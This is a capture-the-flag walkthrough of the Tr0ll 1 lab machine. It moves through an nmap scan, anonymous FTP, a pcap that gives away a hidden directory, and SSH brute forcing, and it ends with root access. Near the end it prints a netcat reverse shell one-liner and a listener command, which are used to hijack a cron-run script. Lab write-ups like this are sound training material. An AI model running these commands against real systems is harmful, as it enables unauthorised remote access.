---
layout: default
title : muzec - Tr0ll 1 Writeup
---

![Image](https://imgur.com/V9fD8x3.png)

We always start with an nmap scan.....

```Nmap -sC -sV -oA nmap <Target-IP>```


```
# Nmap 7.91 scan initiated Wed Apr 21 08:03:57 2021 as: nmap -sC -p- -sV -oA nmap 172.20.10.11
Nmap scan report for 172.20.10.11
Host is up (0.0018s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxrwxrwx    1 1000     0            8068 Aug 10  2014 lol.pcap [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 172.20.10.4
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 600
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 d6:18:d9:ef:75:d3:1c:29:be:14:b5:2b:18:54:a9:c0 (DSA)
|   2048 ee:8c:64:87:44:39:53:8c:24:fe:9d:39:a9:ad:ea:db (RSA)
|   256 0e:66:e6:50:cf:56:3b:9c:67:8b:5f:56:ca:ae:6b:f4 (ECDSA)
|_  256 b2:8b:e2:46:5c:ef:fd:dc:72:f7:10:7e:04:5f:25:85 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/secret
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Apr 21 08:04:08 2021 -- 1 IP address (1 host up) scanned in 10.85 seconds
                                                                                             
```

3 open ports and guess what we have FTP open so we are hitting that first since we have anonymous access to it let check it out.

![Image](https://imgur.com/FRKQQVG.png)

Cool a pcap file let get it to our system and use wireshark to open it.

![Image](https://imgur.com/gAeXnA5.png)

Going through it i found some secret text `Well, well, well, aren't you just a clever little devil, you almost found the sup3rs3cr3tdirlol :-P

Sucks, you were so close... gotta TRY HARDER!
`

Cool so let try the `sup3rs3cr3tdirlol` for the directory.

![Image](https://imgur.com/suFbBRW.png)

Downloaded and using file on it i found out it a ELF file so let try to give it permission and run it.

![Image](https://imgur.com/u8mcKLj.png)

![Image](https://imgur.com/olyRdLM.png)

Probably a secret directory again let try it.

![Image](https://imgur.com/44iKkm4.png)

So we have some usernames in a wordlists and a password list also i actually spend hours here trying figure out the password.

![Image](https://imgur.com/AJoQRM2.png)

![Image](https://imgur.com/y6vqQep.png)

So i try brute forcing SSH but no luck so i try doing adding the `pass.txt` to the wordlists and try brute forcing again and boom we have the password.

![Image](https://imgur.com/BULMwAf.png)

Going through the machine i found something interesting in the `/lib/log` directory.

![Image](https://imgur.com/ODrne88.png)

So let edit it with some reverse shell payload and start an ncat listener with `nc -nvlp 4444` reverse shell payload `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f` NOTE:- edit the Ip and port.

![Image](https://imgur.com/vBN9iqU.png)

Now let wait for it.

![Image](https://imgur.com/lBD4IQG.png)

And we are root.

Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>
